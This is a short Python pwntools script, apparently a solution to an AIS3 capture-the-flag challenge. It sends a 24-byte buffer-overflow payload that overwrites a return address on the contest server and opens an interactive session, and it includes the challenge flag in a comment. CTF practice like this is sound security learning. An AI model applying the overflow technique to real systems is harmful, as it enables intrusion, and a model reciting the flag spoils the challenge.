#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
info = log.info

# AIS3{Re@1_B0F_m4st3r!!}
r = remote("chals1.ais3.org", 12347)
exp = "a"*24 + p64(0x00401216).decode("iso-8859-1")
r.sendline(exp)
r.interactive()
